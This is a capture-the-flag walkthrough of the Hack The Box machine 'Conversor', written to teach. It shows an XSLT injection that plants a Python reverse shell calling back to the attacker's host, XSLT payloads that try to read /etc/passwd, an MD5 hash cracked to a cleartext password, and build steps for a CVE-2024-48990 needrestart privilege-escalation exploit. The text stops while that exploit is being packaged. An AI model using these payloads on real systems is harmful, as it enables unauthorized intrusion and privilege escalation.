---
Category: HTB/Machines/Linux
tags:
  - HTB
  - Machine
  - Linux
  - Easy
  - XSLTInjection
  - sqlite3
  - Hash
  - Cracking
  - CVE-2024-48990
  - needrestart
---

![](images/Conversor.png)

## Table of Contents

- [Summary](#Summary)
- [Reconnaissance](#Reconnaissance)
    - [Port Scanning](#Port-Scanning)
    - [Enumeration of Port 80/TCP](#Enumeration-of-Port-80TCP)
- [Investigating the Source Code](#Investigating-the-Source-Code)
- [Initial Access](#Initial-Access)
    - [XSLT Injection](#XSLT-Injection)
- [Enumeration (www-data)](#Enumeration-www-data)
- [Privilege Escalation to fismathack](#Privilege-Escalation-to-fismathack)
- [Cracking the Hash](#Cracking-the-Hash)
- [user.txt](#usertxt)
- [Enumeration (fismathack)](#Enumeration-fismathack)
- [Privilege Escalation to root](#Privilege-Escalation-to-root)
    - [CVE-2024-48990: needrestart Privilege Escalation](#CVE-2024-48990-needrestart-Privilege-Escalation)
- [root.txt](#roottxt)

## Summary

The box starts with `Remote Code Execution (RCE)` through `XSLT-Injection`. This is possible because the application does not `validate` or `restrict` any `.xslt` files uploaded by the user.

After gaining `Initial Access` as `www-data` on the box, the `Hash` for another `user` can be found within a `sqlite3` database. All what is needed for `Privilege Escalation` and to grab the `user.txt` is to either `crack` the `Hash` or get the `cleartext password` from `crackstation.net`.

As last step a `Proof of Concept (PoC)` for `CVE-2024-48990` can be used to achieve `Local Privilege Escalation (LPE)` to drop into a shell as `root`.

## Reconnaissance

### Port Scanning

As usual we started with a initial `port scan` using `Nmap`. It showed us that port `22/TCP` and port `80/TCP` were open and accessible to us.

```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- 10.129.37.168 --min-rate 10000
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-25 21:02 CEST
Nmap scan report for 10.129.37.168
Host is up (0.36s latency).
Not shown: 55214 filtered tcp ports (no-response), 10319 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 26.55 seconds
```

```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -Pn 10.129.37.168
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-25 21:04 CEST
Nmap scan report for conversor.htb (10.129.37.168)
Host is up (0.30s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-title: Login
|_Requested resource was /login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.22 seconds
```

### Enumeration of Port 80/TCP

We started investigating port `80/TCP` but ran into a redirect to `conversor.htb` which we needed to add to our `/etc/hosts` file in order to access the website.

- [http://10.129.37.168/](http://10.129.37.168/)

```shell
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.37.168   conversor.htb
```

- [http://conversor.htb/](http://conversor.htb/)

We checked the technologie stack but could't find anything of interest.

```shell
┌──(kali㉿kali)-[~]
└─$ whatweb http://conversor.htb/
http://conversor.htb/ [302 Found] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.129.37.168], RedirectLocation[/login], Title[Redirecting...]
http://conversor.htb/login [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[10.129.37.168], PasswordField[password], Title[Login]
```

The website itself showed the option to `register` and to `login`. We registered a new user and logged in.

![](images/2025-10-25_21-05_80_login.png)

![](images/2025-10-25_21-06_80_register.png)

On the `dashboard` we then could upload a `.xml` and a `.xslt` file. However the `file extension` of `.xslt` immediately gave us the idea of a potential `XSLT-Injection`.

![](images/2025-10-25_21-13_80_dashboard.png)

Furthermore we downloaded the `nmap.xslt` sample for further investigation.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Conversor/files]
└─$ wget http://conversor.htb/static/nmap.xslt
--2025-10-25 21:14:07--  http://conversor.htb/static/nmap.xslt
Resolving conversor.htb (conversor.htb)... 10.129.37.168
Connecting to conversor.htb (conversor.htb)|10.129.37.168|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3216 (3.1K) [application/xslt+xml]
Saving to: ‘nmap.xslt’

nmap.xslt                                                                                                  100%[======================================================================================================================================================================================================================================================================================>]   3.14K  --.-KB/s    in 0.003s  

2025-10-25 21:14:10 (1.12 MB/s) - ‘nmap.xslt’ saved [3216/3216]
```

The sample file contained nothing of value and probably was more intended as a hint and to provide a structure sample.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Conversor/files]
└─$ cat nmap.xslt 
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="html" indent="yes" />

  <xsl:template match="/">
    <html>
      <head>
        <title>Nmap Scan Results</title>
        <style>
          body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(120deg, #141E30, #243B55);
            color: #eee;
            margin: 0;
            padding: 0;
          }
          h1, h2, h3 {
            text-align: center;
            font-weight: 300;
          }
          .card {
            background: rgba(255, 255, 255, 0.05);
            margin: 30px auto;
            padding: 20px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
            width: 80%;
          }
          table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 15px;
          }
          th, td {
            padding: 10px;
            text-align: center;
          }
          th {
            background: rgba(255,255,255,0.1);
            color: #ffcc70;
            font-weight: 600;
            border-bottom: 2px solid rgba(255,255,255,0.2);
          }
          tr:nth-child(even) {
            background: rgba(255,255,255,0.03);
          }
          tr:hover {
            background: rgba(255,255,255,0.1);
          }
          .open {
            color: #00ff99;
            font-weight: bold;
          }
          .closed {
            color: #ff5555;
            font-weight: bold;
          }
          .host-header {
            font-size: 20px;
            margin-bottom: 10px;
            color: #ffd369;
          }
          .ip {
            font-weight: bold;
            color: #00d4ff;
          }
        </style>
      </head>
      <body>
        <h1>Nmap Scan Report</h1>
        <h3><xsl:value-of select="nmaprun/@args"/></h3>

        <xsl:for-each select="nmaprun/host">
          <div class="card">
            <div class="host-header">
              Host: <span class="ip"><xsl:value-of select="address[@addrtype='ipv4']/@addr"/></span>
              <xsl:if test="hostnames/hostname/@name">
                (<xsl:value-of select="hostnames/hostname/@name"/>)
              </xsl:if>
            </div>
            <table>
              <tr>
                <th>Port</th>
                <th>Protocol</th>
                <th>Service</th>
                <th>State</th>
              </tr>
              <xsl:for-each select="ports/port">
                <tr>
                  <td><xsl:value-of select="@portid"/></td>
                  <td><xsl:value-of select="@protocol"/></td>
                  <td><xsl:value-of select="service/@name"/></td>
                  <td>
                    <xsl:attribute name="class">
                      <xsl:value-of select="state/@state"/>
                    </xsl:attribute>
                    <xsl:value-of select="state/@state"/>
                  </td>
                </tr>
              </xsl:for-each>
            </table>
          </div>
        </xsl:for-each>
      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>
```

We headed back to the website and checked the `About` section.

![](images/2025-10-25_21-14_80_about.png)

Then we downloaded the `Source Code Sample` and took a closer look at it.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Conversor/files]
└─$ wget http://conversor.htb/static/source_code.tar.gz
--2025-10-25 21:15:40--  http://conversor.htb/static/source_code.tar.gz
Resolving conversor.htb (conversor.htb)... 10.129.37.168
Connecting to conversor.htb (conversor.htb)|10.129.37.168|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4085760 (3.9M) [application/x-tar]
Saving to: ‘source_code.tar.gz’

source_code.tar.gz                                                                                         100%[======================================================================================================================================================================================================================================================================================>]   3.90M   190KB/s    in 32s     

2025-10-25 21:16:12 (127 KB/s) - ‘source_code.tar.gz’ saved [4085760/4085760]
```

## Investigating the Source Code

After downloading we `extracted` the `tarball`. The `install.md` as well as the `app.py` immediately caught our attention.

```shell
┌──(kali㉿kali)-[/media/…/Machines/Conversor/files/extracted]
└─$ tar -xvf source_code.tar.gz
app.py
app.wsgi
install.md
instance/
instance/users.db
scripts/
static/
static/images/
static/images/david.png
static/images/fismathack.png
static/images/arturo.png
static/nmap.xslt
static/style.css
templates/
templates/register.html
templates/about.html
templates/index.html
templates/login.html
templates/base.html
templates/result.html
uploads/
```

So within the `install.md` we found a hint that there was most likely a `cronjob` running which ensured that the uploaded files got handled properly.

```shell
$ cat install.md 
To deploy Conversor, we can extract the compressed file:

"""
tar -xvf source_code.tar.gz
"""

We install flask:

"""
pip3 install flask
"""

We can run the app.py file:

"""
python3 app.py
"""

You can also run it with Apache using the app.wsgi file.

If you want to run Python scripts (for example, our server deletes all files older than 60 minutes to avoid system overload), you can add the following line to your /etc/crontab.

"""
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
"""
```

```shell
<--- CUT FOR BREVITY --->
* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 "$f"; done
<--- CUT FOR BREVITY --->
```

Within `app.py` we spotted a vulnerability that would lead to `Remote Code Execution (RCE)` through `XSLT-Injection`.

```shell
┌──(kali㉿kali)-[/media/…/Machines/Conversor/files/extracted]
└─$ cat app.py 
from flask import Flask, render_template, request, redirect, url_for, session, send_from_directory
import os, sqlite3, hashlib, uuid

app = Flask(__name__)
app.secret_key = 'Changemeplease'

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DB_PATH = '/var/www/conversor.htb/instance/users.db'
UPLOAD_FOLDER = os.path.join(BASE_DIR, 'uploads')
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

def init_db():
    os.makedirs(os.path.join(BASE_DIR, 'instance'), exist_ok=True)
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS files (
        id TEXT PRIMARY KEY,
        user_id INTEGER,
        filename TEXT,
        FOREIGN KEY(user_id) REFERENCES users(id)
    )''')
    conn.commit()
    conn.close()

init_db()

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

@app.route('/')
def index():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT * FROM files WHERE user_id=?", (session['user_id'],))
    files = cur.fetchall()
    conn.close()
    return render_template('index.html', files=files)

@app.route('/register', methods=['GET','POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = hashlib.md5(request.form['password'].encode()).hexdigest()
        conn = get_db()
        try:
            conn.execute("INSERT INTO users (username,password) VALUES (?,?)", (username,password))
            conn.commit()
            conn.close()
            return redirect(url_for('login'))
        except sqlite3.IntegrityError:
            conn.close()
            return "Username already exists"
    return render_template('register.html')
@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))


@app.route('/about')
def about():
 return render_template('about.html')

@app.route('/login', methods=['GET','POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = hashlib.md5(request.form['password'].encode()).hexdigest()
        conn = get_db()
        cur = conn.cursor()
        cur.execute("SELECT * FROM users WHERE username=? AND password=?", (username,password))
        user = cur.fetchone()
        conn.close()
        if user:
            session['user_id'] = user['id']
            session['username'] = username
            return redirect(url_for('index'))
        else:
            return "Invalid credentials"
    return render_template('login.html')


@app.route('/convert', methods=['POST'])
def convert():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    xml_file = request.files['xml_file']
    xslt_file = request.files['xslt_file']
    from lxml import etree
    xml_path = os.path.join(UPLOAD_FOLDER, xml_file.filename)
    xslt_path = os.path.join(UPLOAD_FOLDER, xslt_file.filename)
    xml_file.save(xml_path)
    xslt_file.save(xslt_path)
    try:
        parser = etree.XMLParser(resolve_entities=False, no_network=True, dtd_validation=False, load_dtd=False)
        xml_tree = etree.parse(xml_path, parser)
        xslt_tree = etree.parse(xslt_path)
        transform = etree.XSLT(xslt_tree)
        result_tree = transform(xml_tree)
        result_html = str(result_tree)
        file_id = str(uuid.uuid4())
        filename = f"{file_id}.html"
        html_path = os.path.join(UPLOAD_FOLDER, filename)
        with open(html_path, "w") as f:
            f.write(result_html)
        conn = get_db()
        conn.execute("INSERT INTO files (id,user_id,filename) VALUES (?,?,?)", (file_id, session['user_id'], filename))
        conn.commit()
        conn.close()
        return redirect(url_for('index'))
    except Exception as e:
        return f"Error: {e}"

@app.route('/view/<file_id>')
def view_file(file_id):
    if 'user_id' not in session:
        return redirect(url_for('login'))
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT * FROM files WHERE id=? AND user_id=?", (file_id, session['user_id']))
    file = cur.fetchone()
    conn.close()
    if file:
        return send_from_directory(UPLOAD_FOLDER, file['filename'])
    return "File not found"
```

The problem occurred because the `XSLT-parser` had no `validations` or `restrictions`.

```shell
<--- CUT FOR BREVITY --->
xml_tree = etree.parse(xml_path, parser)
xslt_tree = etree.parse(xslt_path)
transform = etree.XSLT(xslt_tree)
result_tree = transform(xml_tree)
<--- CUT FOR BREVITY --->
```

```shell
xslt_tree = etree.parse(xslt_path)
```

## Initial Access

### XSLT Injection

Now we prepared a `payload` that should read `/etc/passwd` and provide the content to us.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Conversor/files]
└─$ cat malicious.xml 
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
        <xsl:copy-of select="document('file:///etc/passwd')"/>
    </xsl:template>
</xsl:stylesheet>
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Conversor/files]
└─$ cat exploit.xslt 
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="/">
        <html>
            <body>
                <h1>File Contents:</h1>
                <pre><xsl:copy-of select="document('file:///etc/passwd')"/></pre>
            </body>
        </html>
    </xsl:template>
</xsl:stylesheet>
```

But our first approach ended in a error message basically telling us that `file` was not an option to access any content on the box.

```shell
Error: Cannot resolve URI file:///etc/passwd
```

On our second attempt we used a simple `XML` document and focused on the malicious `.xslt` file and tried to abuse the potential presence of a `cronjob`, executing any script within `/var/www/conversor.htb/scripts/`.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Conversor/files]
└─$ cat malicious.xml 
<?xml version="1.0"?>
<root>
    <data>test</data>
</root>
```

Therefore we created a `payload` that would execute a `reverse shell` as a `Python Script`.

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Conversor/files]
└─$ cat exploit.xslt 
<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:exsl="http://exslt.org/common"
    extension-element-prefixes="exsl">
    
    <xsl:template match="/">
        <exsl:document href="/var/www/conversor.htb/scripts/pwn.py" method="text">
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.16.65",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
        </exsl:document>
        <html><body>Reverse shell written to scripts/pwn.py</body></html>
    </xsl:template>
</xsl:stylesheet>
```

And after uploading it, it showed us the message that our script was successfully written to the directory.

```shell
Reverse shell written to scripts/pwn.py
```

![](images/2025-10-25_22-00_80_exploit.png)

After a few seconds we received the `callback` on our `listener`, stabilized our shell and had achieved `Foothold` on the box.

```shell
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.65] from (UNKNOWN) [10.129.37.168] 51340
bash: cannot set terminal process group (2161): Inappropriate ioctl for device
bash: no job control in this shell
www-data@conversor:~$
```

```shell
www-data@conversor:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@conversor:~$ ^Z
zsh: suspended  nc -lnvp 4444
                                                                                                                                                                                                                                                                                                                                                                                                                                          
┌──(kali㉿kali)-[~]
└─$ stty raw -echo;fg
[1]  + continued  nc -lnvp 4444

www-data@conversor:~$ 
www-data@conversor:~$ export XTERM=xterm
www-data@conversor:~$
```

## Enumeration (www-data)

Now we started with our `Enumeration` as `www-data`.  First of all we checked our `group memberships` and looked for additional `users` on the box.

```shell
www-data@conversor:~$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```shell
www-data@conversor:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
syslog:x:106:113::/home/syslog:/usr/sbin/nologin
uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
tss:x:109:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:110:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:111:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
fismathack:x:1000:1000:fismathack:/home/fismathack:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

We found one additional user called `fismathack` therefore we knew we probably had one more `Privilege Escalation` to perform before we could work on `root`.

| Username   |
| ---------- |
| fismathack |

## Privilege Escalation to fismathack

From the example we previously downloaded we knew that there was a `ussers.db`. We checked on the box if the file was present and if it contained any useful information.

With the use of `strings` we quickly extracted a few `Hashes` and got the `Hash` for the user `fismathack`.

```shell
www-data@conversor:~/conversor.htb$ strings instance/users.db 
SQLite format 3
?tablefilesfiles
CREATE TABLE files (
        id TEXT PRIMARY KEY,
        user_id INTEGER,
        filename TEXT,
        FOREIGN KEY(user_id) REFERENCES users(id)
    ))
indexsqlite_autoindex_files_1files
Ytablesqlite_sequencesqlite_sequence
CREATE TABLE sqlite_sequence(name,seq)
tableusersusers
CREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT
    ))
indexsqlite_autoindex_users_1users
Mbarfoo96948aad3fcae80c08a35c9b5958cd89*
Mfoobar3858f62230ac3c915f300c664312c63f.
!Mfismathack5b5c3ac3a1c897c94caad48e6c71fdec
barfoo
foobar
!       fismathack
users
_c1909261-e157-4522-9cce-d54c43042f22
c1909261-e157-4522-9cce-d54c43042f22.htmlR
_d1077f48-14e1-4d9f-b9c4-5b5484d9c81e
d1077f48-14e1-4d9f-b9c4-5b5484d9c81e.htmlR
_51e7d688-b4c3-49bd-8cd7-1f93cc5642fb
51e7d688-b4c3-49bd-8cd7-1f93cc5642fb.htmlR
_551dece1-9fe8-4105-9cec-7446e2279f1a
551dece1-9fe8-4105-9cec-7446e2279f1a.htmlR
_f4990f1d-b90b-4770-8595-efe3f9c0f8bd
f4990f1d-b90b-4770-8595-efe3f9c0f8bd.htmlR
_1363be8b-c6c8-4227-92cc-1367b434fb14
1363be8b-c6c8-4227-92cc-1367b434fb14.htmlR
_c3f1ec9b-1b2c-49d2-96a6-33aff7028391
c3f1ec9b-1b2c-49d2-96a6-33aff7028391.htmlR
_f06dc183-e13f-4f4c-8389-7e414d7fe573
f06dc183-e13f-4f4c-8389-7e414d7fe573.htmlR
_0facc6c2-7625-4240-9dd0-d1085335224c
0facc6c2-7625-4240-9dd0-d1085335224c.htmlR
_00508ffa-82dd-4c42-9867-7dd4a6b16605
00508ffa-82dd-4c42-9867-7dd4a6b16605.htmlR
_89af2dd2-48b2-41b5-a2ba-e2c7a20b2a8b
89af2dd2-48b2-41b5-a2ba-e2c7a20b2a8b.htmlR
_a10bcb29-b9c0-4b3d-99aa-c4f0e8afd4e2
a10bcb29-b9c0-4b3d-99aa-c4f0e8afd4e2.htmlR
_8374be69-0931-4445-8f58-5589d27ec7d7
8374be69-0931-4445-8f58-5589d27ec7d7.html
c1909261-e157-4522-9cce-d54c43042f22
d1077f48-14e1-4d9f-b9c4-5b5484d9c81e
51e7d688-b4c3-49bd-8cd7-1f93cc5642fb
551dece1-9fe8-4105-9cec-7446e2279f1a
f4990f1d-b90b-4770-8595-efe3f9c0f8bd    (
1363be8b-c6c8-4227-92cc-1367b434fb14
c3f1ec9b-1b2c-49d2-96a6-33aff7028391
f06dc183-e13f-4f4c-8389-7e414d7fe573
0facc6c2-7625-4240-9dd0-d1085335224c
00508ffa-82dd-4c42-9867-7dd4a6b16605
89af2dd2-48b2-41b5-a2ba-e2c7a20b2a8b
a10bcb29-b9c0-4b3d-99aa-c4f0e8afd4e2
U       8374be69-0931-4445-8f58-5589d27ec7d7
```

## Cracking the Hash

Even if we could `crack` the `Hash` for ourselves we decided to go for the quick win and checked `cracktstation.net` if the `Hash` was already cracked. And it was.

```shell
5b5c3ac3a1c897c94caad48e6c71fdec
```

- [https://crackstation.net/](https://crackstation.net/)

| Password          |
| ----------------- |
| Keepmesafeandwarm |

## user.txt

This allowed us to grab the `user.txt` and to move on to work on `root`.

```shell
fismathack@conversor:~$ cat user.txt 
89aea336ad82bea6800b5ea70c059373
```

## Enumeration (fismathack)

As `fismathack` we repeated our steps in `Enumeration` and figured out that the user was able to run `/usr/sbin/needrestart` with `elevated privileges` using `sudo`.

```shell
fismathack@conversor:~$ id
uid=1000(fismathack) gid=1000(fismathack) groups=1000(fismathack)
```

```shell
fismathack@conversor:~$ sudo -l
Matching Defaults entries for fismathack on conversor:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User fismathack may run the following commands on conversor:
    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart
```

The file itself was a `Perl Script` which contained quite a few lines of code.

```shell
fismathack@conversor:~$ file /usr/sbin/needrestart
/usr/sbin/needrestart: Perl script text executable
```

```perl
fismathack@conversor:~$ cat /usr/sbin/needrestart
#!/usr/bin/perl

# nagios: -epn

# needrestart - Restart daemons after library updates.
#
# Authors:
#   Thomas Liske <thomas@fiasko-nw.net>
#
# Copyright Holder:
#   2013 - 2022 (C) Thomas Liske [http://fiasko-nw.net/~thomas/]
#
# License:
#   This program is free software; you can redistribute it and/or modify
#   it under the terms of the GNU General Public License as published by
#   the Free Software Foundation; either version 2 of the License, or
#   (at your option) any later version.
#
#   This program is distributed in the hope that it will be useful,
#   but WITHOUT ANY WARRANTY; without even the implied warranty of
#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#   GNU General Public License for more details.
#
#   You should have received a copy of the GNU General Public License
#   along with this package; if not, write to the Free Software
#   Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301 USA
#

use Cwd qw(realpath);
use Getopt::Std;
use NeedRestart;
use NeedRestart::UI;
use NeedRestart::Interp;
use NeedRestart::Kernel;
use NeedRestart::uCode;
use NeedRestart::Utils;
use Sort::Naturally;
use Locale::TextDomain 'needrestart';
use List::Util qw(sum);

use warnings;
use strict;

$|++;
$Getopt::Std::STANDARD_HELP_VERSION++;

my $LOGPREF = '[main]';
my $is_systemd = -d q(/run/systemd/system);
my $is_runit = -e q(/run/runit.stopit);
my $is_tty = (-t *STDERR || -t *STDOUT || -t *STDIN);
my $is_vm;
my $is_container;

if($is_systemd && -x q(/usr/bin/systemd-detect-virt)) {
        # check if we are inside of a vm
        my $ret = system(qw(/usr/bin/systemd-detect-virt --vm --quiet));
        unless($? == -1 || $? & 127) {
                $is_vm = ($? >> 8) == 0;
        }

        # check if we are inside of a container
        $ret = system(qw(/usr/bin/systemd-detect-virt --container --quiet));
        unless($? == -1 || $? & 127) {
                $is_container = ($? >> 8) == 0;
        }
}
elsif(eval "use ImVirt; 1;") {
        require ImVirt;
        ImVirt->import();
        my $imvirt = ImVirt::imv_get(ImVirt->IMV_PROB_DEFAULT);

        $is_vm = $imvirt ne ImVirt->IMV_PHYSICAL;
        $is_container = $imvirt eq ImVirt->IMV_CONTAINER;
}
elsif (-r "/proc/1/environ") {
        # check if we are inside of a container (fallback)
    local $/;
    open(HENV, '<', '/proc/1/environ');
    $is_container = scalar(grep {/^container=/;} unpack("(Z*)*", <HENV>));
    close(HENV)
}

sub HELP_MESSAGE {
    print <<USG;
Usage:

  needrestart [-vn] [-c <cfg>] [-r <mode>] [-f <fe>] [-u <ui>] [-(b|p|o)] [-klw]

    -v          be more verbose
    -q          be quiet
    -m <mode>   set detail level
        e       (e)asy mode
        a       (a)dvanced mode
    -n          set default answer to 'no'
    -c <cfg>    config filename
    -r <mode>   set restart mode
        l       (l)ist only
        i       (i)nteractive restart
        a       (a)utomatically restart
    -b          enable batch mode
    -p          enable nagios plugin mode
    -o          enable OpenMetrics output mode, implies batch mode, cannot be used simultaneously with -p
    -f <fe>     override debconf frontend (DEBIAN_FRONTEND, debconf(7))
    -t <seconds> tolerate interpreter process start times within this value
    -u <ui>     use preferred UI package (-u ? shows available packages)

  By using the following options only the specified checks are performed:
    -k          check for obsolete kernel
    -l          check for obsolete libraries
    -w          check for obsolete CPU microcode

    --help      show this help
    --version   show version information

USG
}

sub VERSION_MESSAGE {
    print <<LIC;

needrestart $NeedRestart::VERSION - Restart daemons after library updates.

Authors:
  Thomas Liske <thomas\@fiasko-nw.net>

Copyright Holder:
  2013 - 2022 (C) Thomas Liske [http://fiasko-nw.net/~thomas/]

Upstream:
  https://github.com/liske/needrestart

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation; either version 2 of the License, or
(at your option) any later version.

LIC
#/
}
<--- CUT FOR BREVITY --->
```

We quickly ran the script to see what it would do but there was really nothing special to it.

```shell
fismathack@conversor:~$ sudo /usr/sbin/needrestart
debconf: unable to initialize frontend: Dialog
debconf: (Dialog frontend will not work on a dumb terminal, an emacs shell buffer, or without a controlling terminal.)
debconf: falling back to frontend: Readline
Scanning processes...                                                           
Scanning linux images...                                                        

Running kernel seems to be up-to-date.

No services need to be restarted.

No containers need to be restarted.

No user sessions are running outdated binaries.

No VM guests are running outdated hypervisor (qemu) binaries on this host.
```

## Privilege Escalation to root

### CVE-2024-48990: needrestart Privilege Escalation

A quick research showed that a `Proof of Concept (PoC)` existed for `CVE-2024-48990`. This vulnerability allowed an attacker to achieve `Local Privilege Escalation (LPE)`.

- [https://github.com/ten-ops/CVE-2024-48990_needrestart](https://github.com/ten-ops/CVE-2024-48990_needrestart)

To make the exploit work we modified the `makefile` to create the `binary` ready for us to work with.

```shell
┌──(kali㉿kali)-[/media/…/Machines/Conversor/serve/CVE-2024-48990_needrestart]
└─$ cat makefile
all: lib

lib:
        @mkdir -p build
        @mkdir -p /tmp/attacker/importlib
        @nasm -f elf64 src/main.asm -o build/main.o
        @ld -O3 -shared -z notext -nostdlib build/main.o -o /tmp/attacker/importlib/__init__.so
```

Then we `compiled` the `code` and copied the `folder` called `attacker` from within our `/tmp/` directory in order to create a `ZIP-Archive` which contained all necessary files to execute the exploit.

```shell
┌──(kali㉿kali)-[/media/…/Machines/Conversor/serve/CVE-2024-48990_needrestart]
└─$ make
```

```shell
┌──(kali㉿kali)-[/media/…/Machines/Conversor/serve/CVE-2024-48990_needrestart]
└─$ cp -R /tmp/attacker .
```

```shell
┌──(kali㉿kali)-[/media/…/HTB/Machines/Conversor/serve]
└─$ zip -r CVE-2024-48990_needrestart.zip CVE-2024-48990_needrestart/
  adding: CVE-2024-48990_needrestart/ (stored 0%)
  adding: CVE-2024-48990_needrestart/.git/ (stored 0%)
